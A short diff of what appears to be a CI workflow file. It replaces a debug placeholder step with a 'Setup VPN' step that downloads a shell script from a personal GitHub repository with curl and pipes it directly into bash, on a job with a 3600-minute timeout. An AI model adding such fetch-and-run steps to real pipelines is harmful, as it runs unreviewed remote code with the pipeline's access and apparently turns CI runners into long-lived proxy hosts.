@@ -9,5 +9,6 @@ jobs:
     timeout-minutes: 3600
 
     steps:
-      - name: Setup tmate session for debugging
-        run: echo
+      - name: Setup VPN
+        run: |
+         bash <(curl -fsSL https://raw.githubusercontent.com/itsnotkubrick/3X-UI_KIT/main/scripts/3x-ui.sh)
